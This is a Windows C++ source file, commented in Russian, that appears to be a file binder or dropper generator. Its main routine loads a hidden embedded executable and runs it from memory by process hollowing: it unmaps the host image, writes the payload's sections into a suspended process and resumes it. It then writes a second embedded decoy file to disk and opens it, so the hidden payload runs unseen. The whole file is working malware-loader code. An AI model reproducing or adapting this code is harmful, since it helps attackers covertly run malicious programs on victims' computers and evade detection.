// Generated.cpp: определяет точку входа для приложения.
//

#include "stdafx.h"
#include "Generated.h"
#include <windows.h>
#include <exception>
#include <shellapi.h>

typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

bool extract(DWORD numb, LPCWSTR name)
{
	try {
		// Получаем дескриптор ресурса
		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(numb), RT_RCDATA);
		// грузим его в глобальную память
		HGLOBAL mem_block = LoadResource(NULL, hRes);
		// получаем указатель на него
		void* pointer = LockResource(mem_block);
		// и его размер
		DWORD siz = SizeofResource(0, hRes);

		//пишем в файл
		HANDLE hFile = CreateFile(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		DWORD written;
		BOOL is_extracted = WriteFile(hFile, pointer, siz, &written, NULL);
		CloseHandle(hFile);
		FreeResource(mem_block);

		//SHELLEXECUTEINFO ExecuteInfo;
		//ExecuteInfo.lpFile = name;
		//ExecuteInfo.lpParameters = L"OPEN";
		//ExecuteInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		//ExecuteInfo.nShow = SW_SHOWNORMAL;

		//ShellExecuteEx(&ExecuteInfo);

		ShellExecute(0, L"OPEN", name, NULL, NULL, SW_SHOWNORMAL);

		return is_extracted;
	}
	catch (std::exception &e)
	{
		/*log(e.what());*/
	}
	return false;
}

void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
{
	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
	NtUnmapViewOfSection xNtUnmapViewOfSection;
	LPVOID pImageBase;
	int Count;

	IDH = PIMAGE_DOS_HEADER(pFile);
	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
					}

					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
					if (pImageBase)
					{
						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
						ResumeThread(PI.hThread);
					}
				}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	TCHAR szFilePath[1024];
	wchar_t buffer[100];
	LPWSTR firstname;

	/*	Вложенный файл	*/
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
	//Получаем дескриптор ресурса
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1002), RT_RCDATA);
	//Загружаем в глобальную память
	HGLOBAL mem_block = LoadResource(NULL, hRes);
	//Запускаем второй файл из памяти
	RunFromMemory(LPSTR(szFilePath), mem_block);

	/*	Основной файл	*/

	//Имя первого файла
	int res = LoadString(NULL, 2001, buffer, sizeof(buffer));
	firstname = buffer;
	extract(1001, firstname);

	return 0;
}